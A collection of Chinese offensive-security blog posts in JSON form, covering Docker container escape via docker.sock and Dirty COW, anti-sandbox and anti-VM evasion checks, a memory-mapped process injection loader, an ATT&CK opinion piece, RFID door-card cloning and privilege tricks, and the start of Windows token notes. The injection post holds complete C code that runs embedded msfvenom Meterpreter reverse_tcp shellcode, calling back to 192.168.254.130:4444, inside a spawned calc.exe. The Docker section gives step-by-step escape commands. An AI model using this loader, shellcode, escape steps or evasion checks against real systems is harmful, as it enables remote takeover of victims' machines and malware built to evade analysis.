/bin/bash\n```\n\n![image-20201109141429664](容器安全之docker逃逸.assets/image-20201109141429664.png)\n\n然后在容器内安装docker\n\n```bash\napt-get install docker.io\n备注：这里容器进入之后没有办法直接安装，需要更新：apt-get update\n```\n\n![image-20201109135600326](容器安全之docker逃逸.assets/image-20201109135600326.png)\n\n![image-20201109135623897](容器安全之docker逃逸.assets/image-20201109135623897.png)\n\n查看宿主机docker信息\n\n```\ndocker -H unix:///host/var/run/docker.sock info\n```\n\n![image-20201109141508580](容器安全之docker逃逸.assets/image-20201109141508580.png)\n\n运行一个挂载宿主机根目录的新容器\n\n```\ndocker -H unix:///host/var/run/docker.sock run -v /:/aa -it ubuntu /bin/bash\n```\n\n![image-20201109141641961](容器安全之docker逃逸.assets/image-20201109141641961.png)\n\n查看挂载了宿主机根目录的aa文件夹\n\n![image-20201109141849431](容器安全之docker逃逸.assets/image-20201109141849431.png)\n\n发现已经可以宿主机kali的根目录了，然后可以通过写计划任务，或者是写ssh秘钥进行连接\n\n## 脏牛漏洞\n\n因为容器和宿主机共用内核，所以当宿主机存在脏牛漏洞时可以在容器内部完成逃逸。\n\n#### 影响范围\n\nLinux内核>=2.6.22\n\n```shell\nroot@33ef38054e34:/# git clone https://github.com/gebl/dirtycow-docker-vdso.git\nroot@33ef38054e34:/# cd dirtycow-docker-vdso/\nroot@33ef38054e34:/# make\nroot@33ef38054e34:/# ./0xdeadbeef xx.xx.xx.xx:1234\n```\n\n![image-20201111202611035](容器安全之docker逃逸.assets/image-20201111202611035.png)\n\n## RunC漏洞(CVE-2019-5736)\n\n没找到对应版本的RUNC，可以参考：https://cloud.tencent.com/developer/article/1512483\n\n# 0x04 容器安全防护\n\n安全的问题到最后都是人的问题，容器安全更是一样，在企业内网中除了正式运营的项目的容器配置问题之外，还有可能存在个人部署的docker所以除了严格准守安全基线运行docker之外还需要实时的排查扫描，并且可以尝试利用docker的日志进行高危容器检测。\n\n# 参考链接\n\nhttps://www.freebuf.com/articles/system/221319.html\nhttps://www.cnblogs.com/operationhome/p/10907591.html\n","categories":["大数据/云/容器"]},{"title":"反沙箱虚拟机技术","url":"/2020/12-18-反沙箱虚拟机技术/","content":"\n## 各种层面的虚拟化技术\n\n![1576417502772](反沙箱虚拟机技术.assets/1576417502772.png)\n\n## 常见反沙箱技术\n\n### 直接检测沙箱的存在\n\n#### 检测虚拟设备名\n\n通过使用相关API来枚举设备细节，检测虚拟化软件的存在，例如[SetupDiGetClassDevsA](https://docs.microsoft.com/en-us/windows/win32/api/setupapi/nf-setupapi-setupdigetclassdevsw):\n\n![1576417948454](反沙箱虚拟机技术.assets/1576417948454.png)\n\n[SetupDiEnumDeviceInfo](https://docs.microsoft.com/en-us/windows/win32/api/setupapi/nf-setupapi-setupdienumdeviceinfo):\n\n![1576418060072](反沙箱虚拟机技术.assets/1576418060072.png)\n\n[SetupDiGetDeviceRegistryPropertyA](https://docs.microsoft.com/en-us/windows/win32/api/setupapi/nf-setupapi-setupdigetdeviceregistrypropertya):\n\n![1576418139422](反沙箱虚拟机技术.assets/1576418139422.png)\n\n可以看到在在虚拟机中的设备管理器中的驱动器是带有VMware SATA、VMware Virtual等信息的。\n\n![1576418561528](反沙箱虚拟机技术.assets/1576418561528.png)\n\n或者通过WMI获取主机的主板序列号、主机型号等信息\n\n```\nwmic bios get serialnumber\nwmic csproduct get name\n```\n\n![1576418403323](反沙箱虚拟机技术.assets/1576418403323.png)\n\n#### 检测进程名\n\n使用[Process32First](https://docs.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-process32first)，[Process32Next](https://docs.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-process32next)等WINAPI列举进程，查找是否存在虚拟机中特有的进程。\n\n常见虚拟化进程：\n\n```\nvboxservice.exe(VirtualBox)\nvboxtray.exe(VirtualBox)\nvmtoolsd.exe(VMWARE)\nvmwaretray.exe(VMWARE)\nvmwareuser(VMWARE)\nVGAuthService.exe(VMWARE)\nvmacthlp.exe(VMWARE)\nvmsrvc.exe(VirtualPC)\nvmusrvc.exe(VirtualPC)\nprl_cc.exe(Parallels)\nprl_tools.exe(Parallels)\nxenservice.exe(Citrix Xen)\nqemu-ga.exe(QEMU)\n```\n\n#### 检测注册表\n\n```\nHARDWARE\\DEVICEMAP\\Scsi\\Scsi Port 0\\Scsi Bus 0\\Target Id 0\\Logical Unit Id 0 (Identifier)\t(VirtualBox) \nHARDWARE\\DEVICEMAP\\Scsi\\Scsi Port 0\\Scsi Bus 0\\Target Id 0\\Logical Unit Id 0 (Identifier)   (QEMU)\nHARDWARE\\Description\\System (SystemBiosVersion)\t(VBOX)\nHARDWARE\\Description\\System (SystemBiosVersion)\t(QEMU) (VirtualBox) (VMWARE) (VMWARE) (VMWARE) (VMWARE) (VMWARE)\n(VirtualBox) (VirtualBox) (VirtualBox) (VirtualBox) (VirtualBox) (VirtualBox)\nSYSTEM\\ControlSet001\\Services\\VBoxVideo\t(VirtualBox)\nSOFTWARE\\VMware, Inc.\\VMware Tools\n```\n\n#### 检测硬盘中的文件\n\n```\nsystem32\\drivers\\VBoxMouse.sys \nsystem32\\drivers\\VBoxGuest.sys \nsystem32\\drivers\\VBoxSF.sys \nsystem32\\drivers\\VBoxVideo.sys \nsystem32\\vboxdisp.dll \nsystem32\\vboxservice.exe \nsystem32\\vboxtray.exe \nsystem32\\VBoxControl.exe \nsystem32\\drivers\\vmmouse.sys \nsystem32\\drivers\\vmhgfs.sys \nsystem32\\drivers\\vm3dmp.sys \nsystem32\\drivers\\vmci.sys \nsystem32\\drivers\\vmhgfs.sys \nsystem32\\drivers\\vmmemctl.sys \nsystem32\\drivers\\vmmouse.sys \nsystem32\\drivers\\vmrawdsk.sys \nsystem32\\drivers\\vmusbmouse.sys\n```\n\n#### 检测MAC地址\n\n虚拟网卡信息会有固定的指纹，一般是前三个字节标识一个提供商\n\n```\n00:05:69:xx:xx:xx Vmware\n00:0C:29:xx:xx:xx Vmware\n00:1C:14:xx:xx:xx Vmware\n00:50:56:xx:xx:xx Vmware\n00:15:5D:xx:xx:xx Hyper-V\n00:16:3e:xx:xx:xx Xen\n08:00:27:xx:xx:xx VirtualBox\n0a:00:27:xx:xx:xx Hybrid Analysis\n```\n\n#### 检测相关服务\n\n```\nVBoxWddm\nVBoxSF\nVBoxMouse\nVBoxGuest\nvmci\nvmhgfs\nvmmouse\nvmmemctl\nvmusb\nvmusbmouse\nvmx_svga\nvmxnet\nvmx86\n```\n\n### 检测运行时的环境\n\n#### wear and tear\n\n也就是利用损耗特征来对虚拟机进行检测，细节可以参考：http://www.arkteam.net/?p=3897     https://ieeexplore.ieee.org/document/7958622/\n\n#### 检测开机时间\n\n许多沙箱检测完毕后会重置系统，我们可以检测开机时间来判断是否为真实的运行状况。 我们使用WinAPI GetTickCount()来获取机器已运行的时间（以秒为单位），然后判断开机运行时间是否大 于1个小时，如果开机时间小于1小时就表示当前机器是虚拟机。\n\n![1578130813203](反沙箱虚拟机技术.assets/1578130813203.png)\n\n#### 检测物理内存\n\n现在大多数PC机器都具有4GB以上的RAM,我们可以检测RAM是否大于4GB来判断是否是真实的运行机器。可以用GlobalMemoryStatusEx来获取内存信息，其中它的成员ullTotalPhys为物理内存大小。\n\n#### 检测临时文件\n\n正常使用的系统，其中用户的临时文件夹中有一定数量的临时文件，可以通过判断临时文件夹内的文件数量来检测是否在沙箱中运行。先使用GetEnvironmentVariable()获取temp路径， 再利用FindFirstFile()与FindNextFile()枚举temp文件 夹内的文件数量，如果小于30就表示当前机器是虚拟机。\n\n#### 检测CPU核心数\n\n一种方法是通过简单的API GetSystemInfo中的值dwNumberOfProcessors来计算CPU核心数，技术技术的进步，大多数恶意软件家族选择使用WMI以及更为隐蔽的引入基于PEB内联汇编代码或者使 用内部函数来实现的方法。\n\n#### 检测是否有用户交互\n\n因为自动化分析系统永远不会与真实用户进行交互。早期传统的沙箱在设计上并没有去模拟用户行为，因此恶意软件在开发过程中加入了相关代码，用来检测自动化系统与真实系统之间的差异。例如恶意 软件会检查鼠标移动轨迹来判断是否有用户交互存在。有些恶意软件还会检查注册表键值，判断MRU（Most Recently Used，最近使用）文件来分析用户与被感染系统的历史交互行为。\n\n#### 延迟执行\n\n 一般沙箱运行样本的时间是比较短的，因为其没有过多资源可以供程序长时间运行，所以恶 意软件可能会延迟等待一会儿后再进行真实的操作。\n相关API：\n\n```\nsleep()\nsleep_for()\nNtDelayExecution()\nCreateWaitTableTimer()\nSetTimer()\n```\n\nAPI Flooding：在循环中调用无用的API来引入执行延迟。比如延长10分钟之后执行。\n\n#### 利用漏洞指令\n\n这种方法主要是针对x86 ISA 中有十多条敏感指令不是特权指令，因此 x86 无法使用经典的虚拟化技术完全虚拟化导致的。\n最常用的指令是：\n\n```\ncpuid\nsidt\nsgdt\nsldt\nin\nstr\n```\n\n这里说到特权指令，那么什么是特权指令？\n\n许多操作系统有至少两种独立的操作模式：\n\n```\n用户模式（user mode)\n监督程序模式(nomitor mode)(也称为管理模式(supervisor mode)\n\n系统模式(system mode)\n特权模式(privileged mode))\n```\n\n设计这些模式的目的是为了区分操作系统代码和用户定义代码的执行，从而确保操作系统的正常执行。如果在用户模式下试图执行特权指令，那么硬件并不执行该指令，而是认为该指令非法，并将其以陷阱（trap）的形式通知操作系统。\n\n```\n允许和禁止中断，控制中断禁止屏蔽位\n在进程间切换处理\n存取用于主存保护的寄存器\n执行I/O操作\n停止一个中央处理器的工作\n清理内存\n设置时钟\n建立存储键\n加载PSW\n```\n\n特权指令CPUID\n\n当eax=0x40000000时，运行CPUID之后，ebx,ecx,edx不等于0，则运行在虚拟机里，如果等于0表示不在虚拟机里。示例代码（http://blog.nsfocus.net/malicious-sample-analysis-manual-virtual-machine-test-bottom/）：\n\n```\nBOOL isVirtualBoxBySpecInstruct()\n{\n    bool res = FALSE;\n    __asm\n    {\n        mov eax,0x40000000      //HYPERV_CPUID_VENDOR_AND_MAX_FUNCTIONS\n        cpuid\n        cmp ebx,0               //ebx,ecx,edx != 0 in vm other not in vm\n        jne l1\n        mov res,0\n        jmp ed\n        l1:\n        mov res,1\n        ed:\n    }\n    return res;\n}\n```\n\n同事可以根据cpuid的返回信息来进行判断\n\n```\nEAX = 0x40000000,获取hypervisor信息，返回12字节长度字符串：\n\"KVMKVMKVM\\0\\0\\0\"; /* KVM */\n\"Microsoft Hv\"; /* Microsoft Hyper-V or Wi \"VMwareVMware\"; /* VMware */ \"XenVMMXenVMM\"; /* Xen */\n\"prl hyperv\"; /* Parallels */\n\"VBoxVBoxVBox\"; /* VirtualBox */\n```\n\n![1578132793061](反沙箱虚拟机技术.assets/1578132793061.png)\n\n还有一些其他的指令也可以用于检测：\n\n```\nsidt指令获取IDTR寄存器的值： IDTR寄存器是48位寄存器，，用于保存IDT表的信息，其中第五个字节（高32位）是IDT的内存基址 在Vmware虚拟机上的IDT地址高字节通常为0xff；VirtualPC则是0xe8；在真实主机上通常为0x80。\n\nsgdt和sldt指令获取GDTR寄存器和LDTR寄存器的值：\n正常情况下，windows是不会使用GDT 和LDT表的，所以主机上GDTR寄存器和LDTR寄存器的值为0；由于虚拟机 对GDT 和LDT进行了虚拟化，所以它们是非0值。\n\nin指令： 在指定功能号0A（获取VMware版本）的情况下，它会在EBX中返回其版本号“VMXH”；而当功能号为0x14时，可 用于获取VMware内存大小，当大于0时则说明处于虚拟机中，真实机器中会异常。\n\nstr指令： 在虚拟机和真实主机之中，通过STR读取的地址是不同的，当地址等于0x0040xxxx时，说明处于虚拟机中，否则为真 实主机。\n```\n\n#### 利用时间差\n\n由于在虚拟机中，代码的运行速度通常不如真实主机。所以恶意代码通过运行一段特定的代码来比较这段代码 在虚拟机和真实主机之中的相对运行时间，以此来判断是否处于虚拟机之中。\n\nxchg  ecx,  eax 一句指令的运行时间为例，这段指令在真实主机windows 7系统上的运行时间为0000001E，而该指令在虚拟机WinXP下的运行时间为00000442，两者之间的运行时 间明显差别很多。一般情况下，当它的运行时间大于0xFF 时，就可以确定它处于虚拟机之中。\n\n![1578132930348](反沙箱虚拟机技术.assets/1578132930348.png)\n\n### 其他trips\n\n#### 重启操作系统\n\n许多沙箱无法在重新启动后生存，某些恶意软件尝试通过重新登录用户来模拟重新启动。\n\n#### 文件大小限制\n\n一些沙箱仅支持一定大小的文件，例如10 MB\n\n#### 多重压缩\n\n一部分沙箱仅支持解压一两层压缩包\n\n#### 电脑常用软件\n\n许多分析虚拟机中没有安装常用软件\n\n#### 检测CPU温度\n\n虚拟机中的CPU温度是模拟的，会有异常。","categories":["二进制相关"]},{"title":"内存映射文件的注入方式","url":"/2020/12-18-内存映射文件的注入方式/","content":"\n这个内容主要是最近学到了windows核心编程的第十七章内存映射文件，刚好看到雪师傅也写到了相关的文章(参考链接中标记了)，所以学习一下\n\n## 内存映射文件\n\n书中说到windows对内存进行操作的三种机制：\n\n```\n1、虚拟内存\n2、内存映射文件\n3、堆\n```\n\n本次讨论的就是利用内存映射文件的机制进行远程进程注入。\n\n在使用内存映射文件的时候是分三个阶段(步骤的)：\n\n```\n1、创建或者打开一个文件内核对象(CreateFile),标识了我们想要用作内存映射文件的那个磁盘文件。\n2、创建一个文件映射内核对象(CreateFileMapping),告诉系统的大小以及我们打算如何访问文件。\n3、告诉系统把文件映射对象的部分或全部映射到进程的地址空间中(MapViewOfFile)\n```\n\n三个步骤分别使用三个API，下面的例子中没有使用CreateFile，而是直接使用CreateFileMapping将文件映射内核对象映射到一块shellcode的地址上。\n\n## 实现代码\n\n这块代码说是拷贝[idiotc4t](https://idiotc4t.com/code-and-dll-process-injection/mapping-injection)的博客中的\n\n```c++\n#include <windows.h>\n#include <stdio.h>\n#pragma comment (lib, \"OneCore.lib\")\n//引用MapViewOfFile2\n\n//msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.254.130 lport=4444 -f c\nunsigned char shellcode[] =\n\"\\xfc\\xe8\\x82\\x00\\x00\\x00\\x60\\x89\\xe5\\x31\\xc0\\x64\\x8b\\x50\\x30\"\n\"\\x8b\\x52\\x0c\\x8b\\x52\\x14\\x8b\\x72\\x28\\x0f\\xb7\\x4a\\x26\\x31\\xff\"\n\"\\xac\\x3c\\x61\\x7c\\x02\\x2c\\x20\\xc1\\xcf\\x0d\\x01\\xc7\\xe2\\xf2\\x52\"\n\"\\x57\\x8b\\x52\\x10\\x8b\\x4a\\x3c\\x8b\\x4c\\x11\\x78\\xe3\\x48\\x01\\xd1\"\n\"\\x51\\x8b\\x59\\x20\\x01\\xd3\\x8b\\x49\\x18\\xe3\\x3a\\x49\\x8b\\x34\\x8b\"\n\"\\x01\\xd6\\x31\\xff\\xac\\xc1\\xcf\\x0d\\x01\\xc7\\x38\\xe0\\x75\\xf6\\x03\"\n\"\\x7d\\xf8\\x3b\\x7d\\x24\\x75\\xe4\\x58\\x8b\\x58\\x24\\x01\\xd3\\x66\\x8b\"\n\"\\x0c\\x4b\\x8b\\x58\\x1c\\x01\\xd3\\x8b\\x04\\x8b\\x01\\xd0\\x89\\x44\\x24\"\n\"\\x24\\x5b\\x5b\\x61\\x59\\x5a\\x51\\xff\\xe0\\x5f\\x5f\\x5a\\x8b\\x12\\xeb\"\n\"\\x8d\\x5d\\x68\\x33\\x32\\x00\\x00\\x68\\x77\\x73\\x32\\x5f\\x54\\x68\\x4c\"\n\"\\x77\\x26\\x07\\x89\\xe8\\xff\\xd0\\xb8\\x90\\x01\\x00\\x00\\x29\\xc4\\x54\"\n\"\\x50\\x68\\x29\\x80\\x6b\\x00\\xff\\xd5\\x6a\\x0a\\x68\\xc0\\xa8\\xfe\\x82\"\n\"\\x68\\x02\\x00\\x11\\x5c\\x89\\xe6\\x50\\x50\\x50\\x50\\x40\\x50\\x40\\x50\"\n\"\\x68\\xea\\x0f\\xdf\\xe0\\xff\\xd5\\x97\\x6a\\x10\\x56\\x57\\x68\\x99\\xa5\"\n\"\\x74\\x61\\xff\\xd5\\x85\\xc0\\x74\\x0a\\xff\\x4e\\x08\\x75\\xec\\xe8\\x67\"\n\"\\x00\\x00\\x00\\x6a\\x00\\x6a\\x04\\x56\\x57\\x68\\x02\\xd9\\xc8\\x5f\\xff\"\n\"\\xd5\\x83\\xf8\\x00\\x7e\\x36\\x8b\\x36\\x6a\\x40\\x68\\x00\\x10\\x00\\x00\"\n\"\\x56\\x6a\\x00\\x68\\x58\\xa4\\x53\\xe5\\xff\\xd5\\x93\\x53\\x6a\\x00\\x56\"\n\"\\x53\\x57\\x68\\x02\\xd9\\xc8\\x5f\\xff\\xd5\\x83\\xf8\\x00\\x7d\\x28\\x58\"\n\"\\x68\\x00\\x40\\x00\\x00\\x6a\\x00\\x50\\x68\\x0b\\x2f\\x0f\\x30\\xff\\xd5\"\n\"\\x57\\x68\\x75\\x6e\\x4d\\x61\\xff\\xd5\\x5e\\x5e\\xff\\x0c\\x24\\x0f\\x85\"\n\"\\x70\\xff\\xff\\xff\\xe9\\x9b\\xff\\xff\\xff\\x01\\xc3\\x29\\xc6\\x75\\xc1\"\n\"\\xc3\\xbb\\xf0\\xb5\\xa2\\x56\\x6a\\x00\\x53\\xff\\xd5\";\n\nint main() {\n\tSTARTUPINFO si = { 0 };\n\tPROCESS_INFORMATION pi = { 0 };\n\tsi.cb = sizeof(STARTUPINFO);\n\n\t//创建大小为sizeof(shellcode)的文件映射内核对象，并返回一个用来标识所创建的文件映射对象的句柄\n\tHANDLE hMapping = CreateFileMapping(\n\t\tINVALID_HANDLE_VALUE, //使用INVALID_HANDLE_VALUE时\n\t\tNULL, //该结构确定子进程是否可以继承返回的句柄\n\t\tPAGE_EXECUTE_READWRITE, //指定文件映射对象的页面保护\n\t\t0, //高位文件大小\n\t\tsizeof(shellcode), //低位文件大小\n\t\tNULL//文件映射对象的名称\n\t);\n\n\t//将地址映射到当前进程的地址空间中，返回值为进程空间的起始地址\n\tLPVOID lpMapAddress = MapViewOfFile(\n\t\thMapping, //handle句柄\n\t\tFILE_MAP_WRITE, //对文件映射对象的访问类型\n\t\t0, //高阶\n\t\t0, //低阶\n\t\tsizeof(shellcode)//映射到进程内存空间的文件映射的字节数\n\t);\n\n\t//将shellcode复制到当前进程的虚拟地址空间中\n\tmemcpy((PVOID)lpMapAddress, shellcode, sizeof(shellcode));\n\n\t//创建calc.exe进程\n\tCreateProcessA(\n\t\t\"C:\\\\Windows\\\\System32\\\\calc.exe\", //要执行的模块的名称\n\t\tNULL, //要执行的命令行\n\t\tNULL, //进程安全描述符\n\t\tNULL, //线程安全描述符\n\t\tTRUE, //决定子进程是否继承父进程句柄表中的\"可继承句柄\"\n\t\tCREATE_SUSPENDED | CREATE_NO_WINDOW, //创建的状态CREATE_SUSPENDED标识挂起的状态下创建\n\t\tNULL, \n\t\tNULL, \n\t\t(LPSTARTUPINFOA)&si, //pStartupInfo结构指针\n\t\t&pi//PROCESS_INFORMATION结构的指针\n\t);\n\n\t//\n\tLPVOID lpMapAddressRemote = MapViewOfFile2(\n\t\thMapping, //createfilemapping的返回值句柄\n\t\tpi.hProcess, //进程句柄\n\t\t0, \n\t\tNULL, \n\t\t0, \n\t\t0, \n\t\tPAGE_EXECUTE_READ\n\t);\n\t\n    //将lpMapAddressRemote指向的函数加入到pi.hThread(也就是calc.exe的主线程)的APC队列中\n\tQueueUserAPC((PAPCFUNC)lpMapAddressRemote, pi.hThread, NULL);\n\n\tResumeThread(pi.hThread);\n\tCloseHandle(pi.hThread);\n\tCloseHandle(hMapping);\n\tUnmapViewOfFile(lpMapAddress);\n\treturn 0;\n}\n```\n\n流程分析：\n\n```\n1、先使用CreateFileMapping创建一个文件映射对象，对象指向的\"文件\"大小为shellcode的长度，这里没有使用CreateFile，而是将第一个参数设置为INVALID_HANDLE_VALUE，表示告诉系统我们创建的文件映射对象的物理存储器不是磁盘上的文件，而是希望系统从页交换文件中调拨物理存储器。\n2、使用MapViewOfFile将这个对象映射到当前进程的虚拟地址空间(这里只是对地址做映射)\n3、使用memcpy将shellcode内容复制到当前的虚拟地址空间中(这里才是真的复制进去了)\n4、CreateProcess创建calc.exe进程\n5、使用MapViewOfFile2将内核中文件映射对象指向的当前进程的内存映射到calc.exe进程中，如果映射成功则返回地址目标进程中的起始地址lpMapAddressRemote\n6、通过QueueUserAPC将lpMapAddressRemote指向的函数加入到pi.hThread(也就是calc.exe的主线程)的APC队列中\n7、使用ResumeThread恢复挂起的线程(CPU给calc.exe的主线程分配时间)\n```\n\n`CreateFileMapping-->MapViewOfFile-->memcpy-->CreateProcess-->MapViewOfFile2-->QueueUserAPC`\n\n下面是依靠自己的理解画的一个调用图，如果有问题可以联系我进行修改：\n\n![mapping_inject](内存映射文件的注入方式.assets/mapping_inject.jpg)\n\n## 参考链接\n\nhttp://blog.leanote.com/archives/snowming\nhttps://idiotc4t.com/code-and-dll-process-injection/mapping-injection\nhttps://hakin9.org/mapping-injection-just-another-windows-process-injection/\nhttps://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-mapviewoffile2","categories":["二进制相关"]},{"title":"关于ATT&CK的一点看法","url":"/2020/12-18-关于ATT&CK的一点看法/","content":"\n# 关于ATT&CK的一点看法\n\nATT&CK框架出来实际上已经很久了，但是今年把博客重新搭了起来，还是决定写一下，也锻炼一下文字方面的表达能力。\n\n# ATT&CK是什么\n\n在2019年年初的时候刚刚听到这个框架的时候实际上并不知道是做什么的，搜了很多描述的全是高大上的概念，直到看了官网的每一个技术点，才发现原来就是一个各个阶段的攻击方法和攻   击点的汇总，可能这么说无法完全涵盖它的内容和意义，但是这应该是他最核心的内容了。\n\n# 在了解ATT&CK的时候应该关注的点？\n\n## 攻方视角\n\n在最初了解到ATT&CK的框架结构之后就计划把它的所有的技术点都复现一遍，最后花了一段时间复现了其中的五个阶段的技术点（Credential Access、Execution、Lateral Movement、Persistence、Privilege Escalation），复现完成之后对个人来说觉得知识面变广了，了解到了一些此前不知道的攻击手法，个人认为作为攻击者，在学习的时候除了关注本身的攻击手法，还要考虑这种攻击手法所能够应用的场景，以及是什么时候提出来的，在现在攻防转变的时候是否还适用于当前的网络环境。\n\n如果是针对特定场景的企业蓝军，在蓝军建设的时候也应该考虑，ATT&CK中是不是所有的技术点都适用于当前企业的网络环境，再根据相应的业务和特定的安全场景，打造出属于当前环境的蓝军知识库。\n\n## 守方视角\n\n防守方除了像攻击方一样了解各种各样的攻击手法的同时，还要给出相应的防守和监测思路，这是非常大的一个工作量，知道了一个攻击的同时，还要知道这种攻击方式会产生什么样的网络日志，什么样的终端事件日志，以及在众多的日志中保证误报率和漏报率。另外在做企业安全建设的时候应该要基于企业自身的资产来单独思考有针对性的安全场景，对一些攻击链中肯定会遇到的技术点做更深层次的检测，这样如果有其他遗漏的点，也会有其中一点告警，然后就可以根据这一个点再进行溯源和分析。\n\n## 覆盖率\n\n此前听到说过关于ATT&CK的覆盖率这一说，但是在我眼里所有的关于ATT&CK的覆盖率都是一种不负责任的说法，因为每一个章节的每种攻击，可能有多种利用方式，不同的利用方式还有不同的工具，可能不同的工具产生的日志是有区别的。所以覆盖率只能说是尽量的提升，而不可能精确到具体的数值。\n\n比如Execution章节中的T1085技术点rundll32，我们可以通过webshell执行命令，也可能可以在本地执行，也可以通过SMB调用远程DLL或者通过JS调用，这些种不同的功能在大多数人所说的覆盖率里就是只要检测出来一个就算是覆盖到了，而事实是大部分产品并没有做到对每一种方式都能够检出。所以在没有统一标准更无法形成统一标准的情况下，覆盖率就是个伪命题。\n\n## 产品落地\n\n对于如何将ATT&CK在产品中落地，首先应该看对应的产品，比如像传统的NIDS就主要关注每一种攻击方法中产生的流量日志等，最主要的是根据计划，每一种攻击方式要尽可能的想到不同的利用点，才能真正的完善产品的检测能力。 ","categories":["ATT&CK"]},{"title":"低频ID卡安全性综述","url":"/2020/12-18-低频ID卡安全性综述/","content":"\n由于最近有一个关于门禁的测试项目，所以正好了解了一下关于门禁的相关安全问题，测试目标使用的是ID卡门禁，所以记录一下关于ID卡的安全点。\n\n# ID卡简介\n\n低频ID卡(identification card，身份识别卡)，是一种不可写入的感应卡，每张ID卡有一个全球唯一的芯片编码。每张ID卡有一个全球唯一的芯片编码。\n\n![image-20200928212222513](低频ID卡安全性综述.assets/image-20200928212222513.png)\n\n市面上使用比较多的有EM4100和T5577两种，多数为门禁，考勤等系统内使用。\n\n两种的特性和区别：\n\n```\nEM4100：\n低频(125kHz)/常用固化ID卡，只能读不能写\nT5577：\n低频(125kHz)/出厂为空卡，可以用来克隆ID卡，经过测试实际上也可以直接写入\n```\n\n# ID卡工作过程\n\nID卡的工作过程可以分为下面几部：\n\n```\n1、ID卡阅读器将载波信bai号经天线向外发送，载波频du率为125KHZ（THRC12）\n2、ID卡进入卡阅读器的工作区域后，由阅读器中电感线圈和电容组成的谐振回路接收阅读器发射的载波信号，卡中芯片的射频接口模块由此信号产生出电源电压、复位信号及系统时钟，使芯片“激活”；\n3、芯片读取控制模块将存储器中的数据经调相编码后调制在载波上，经卡内天线回送给卡阅读器；\n4、卡阅读器对接收到的卡回送信号进行解调、解码后送至后台计算机；\n5、后台计算机根据卡号的合法性，针对不同应用做出相应的处理和控制。\n```\n\n# ID卡的常见利用工具\n\n## 读写器\n\n比如我使用的就是这个在淘宝上买的ID卡读写器，可以直接写入ID，也可以复制ID卡\n\n<img src=\"低频ID卡安全性综述.assets/image-20200928213347659.png\" alt=\"image-20200928213347659\" style=\"zoom:50%;\" />\n\n## 低频白卡\n\n![image-20200928213533987](低频ID卡安全性综述.assets/image-20200928213533987.png)\n\n![image-20200928213550219](低频ID卡安全性综述.assets/image-20200928213550219.png)\n\n像这两种卡片都可以进行复制和写入。\n\n## Proxmark3\n\nProxmark3是一款功能非常强大的RFID工具，但是价格相对较高，因为我只测试ID类型的卡，就没有买，直接买了一个淘宝上的读卡工具\n\n![image-20200928215758911](低频ID卡安全性综述.assets/image-20200928215758911.png)\n\n# 实战中的ID卡安全\n\n## 常见门禁系统架构\n\n一般情况下的门禁系统主要是由服务器数据库还有控制器、门锁、门锁读卡器等组成，一般都会集成了上班打卡和门禁甚至是食堂等多种功能：\n\n![未命名文件](低频ID卡安全性综述.assets/未命名文件.jpg)\n\n对于门禁的读卡器和联网控制器所使用的协议有RS232/RS485/WG64等串行标准协议，可以参考下面的设计框架：\n\n![image-20200930204857943](低频ID卡安全性综述.assets/image-20200930204857943.png)\n\n## 利用思路\n\n可以入手的点有：\n\n### 内部的门禁系统本身的漏洞\n\n#### 1、门禁管理系统的WEB/终端漏洞\n\n门禁系统的开发公司一般情况下可能不会太在意自身系统的安全性，如果发现了内网中的门禁管理系统的WEB后台，那么久可以尝试挖掘相关的WEB漏洞，进而控制系统，进行修改卡权限等操作。\n\n#### 2、数据库漏洞\n\n门禁系统可能数据库系统的端口对外开放，并存在弱口令，如果能够爆破或者到检索到高权限账号密码，那么就可以直接写入卡权限、修改余额，甚至可以通过数据库获取操作系统权限，并且有可能拿到管理员HASH值（不属于门禁卡范畴不再说明）\n\n#### 3、操作系统漏洞\n比如MS17-010这样的RCE漏洞，或者是RDP等弱口令，通过系统权限然后控制了门禁管理系统。\n\n### 卡的自身安全性\n\n#### 1、复制卡\n\n应用场景：能够接触到别人的卡（放在桌子上，或者口袋里），或者是拿到别人的一个卡，然后直接复制一个拥有相同权限的卡\n\n![image-20200930211029590](低频ID卡安全性综述.assets/image-20200930211029590.png)\n\n![image-20200930211006715](低频ID卡安全性综述.assets/image-20200930211006715.png)\n\n#### 2、写入高权限的卡ID\n\n常见场景：\n\n```\na) 有数据库权限，就可以拿一张白卡，将白卡写入高权限的CardID,就可以伪造一张别人正在用的卡\nb) 有数据库权限，如果没有白卡也可以给自己的卡进行权限提升\n```\n\n比如通过上面门禁系统的漏洞，拿到了系统权限或者是数据库权限，就可以修改卡的权限，拿测试遇到的一个例子说明，先是拿到了一个数据库的权限，然后通过修改卡ID进行权限提升，比如这里插入一个卡号为12345的卡授予了11111门禁的权限：\n\n```\ninsert into CardDB (CardID,权限字段) values ('12345','11111');\n```\n\n","categories":["RedTeam&域安全"]},{"title":"windows_via_6_7章节进程和线程","url":"/2020/12-18-windows_via_6_7章节进程和线程/","content":"\n最近把windows核心编程学到了6和7章节，然后为了更好的巩固、记忆和复习，所以做了个类似思维导图的进程线程知识点总结，另外Github项目中有在读书时的API练习代码\n\n![跨进程边界共享内核对象](windows_via_6_7章节进程和线程.assets/跨进程边界共享内核对象.png)","categories":["计算机基础"]},{"title":"windows_via_4.5_令牌和权限提升","url":"/2020/12-18-windows_via_4.5_令牌和权限提升/","content":"\n本文主要是《windows核心编程》的4.5节的内容总结，也是最先放在博客上的《windows核心编程》的学习笔记，因为对权限这一块感兴趣所以先看了这一小节。\n\n## windows的令牌（token）\n\n令牌也就是用户在访问系统资源时需要使用的一个凭证，当代码试图访问一个受保护的安全资源时，操作系统就会使用这个安全令牌，这里要重点知道的是操作系统会创建什么样的令牌：\n\n```\n普通账户登录：\n一个与账户对应的安全令牌(security token)\n\n管理员账户登录：\n一个与账户对应的安全令牌(security token)\n一个经过筛选的令牌(filtered token)\t这个filtered token只有标准用户(standard user)的权限\n```\n\n## 让程序自动提升权限\n\n就是在文件运行之前就设置文件运行的权限，细节可以参考：https://docs.microsoft.com/en-us/cpp/build/reference/manifest-create-side-by-side-assembly-manifest?view=vs-2019\n\n![image-20200813205250227](windows_via_4.5_令牌和权限提升.assets/image-20200813205250227.png)\n\nVS里面可以配置\n\n## 手动提升进程的权限\n\n### ShellExecuteEx\n\n这里的权限实际上不是账户的权限，而是进程所拥有的token的权限，这里没有使用原书中的代码，其实一样的，看了下面这段代码会更好的理解：\n\n```c\n#include <iostream>\n#include <windows.h>\n#include <shellapi.h>\n\nint main()\n{\n    